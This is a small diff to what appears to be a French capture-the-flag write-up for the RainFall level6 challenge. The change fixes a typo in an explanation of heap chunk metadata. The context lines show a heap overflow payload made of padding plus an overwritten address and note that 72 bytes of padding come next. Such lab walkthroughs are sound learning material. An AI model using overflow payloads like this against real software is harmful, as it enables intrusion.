@@ -55,7 +55,7 @@ level6@RainFall:~$ ./level6 $(python -c 'print "A" * 64 + "\x54\x84\x04\x08"')
 Nope
 ```
 
-Puisque en realite la taille reelle du bloc est `64 + 8` octetss `8` pour les metadata du bloc
+Puisque en realite la taille reelle du bloc est `64 + 8` octets `8` pour les metadata du bloc
 
 Essayons avec un padding de `72 octets`
 
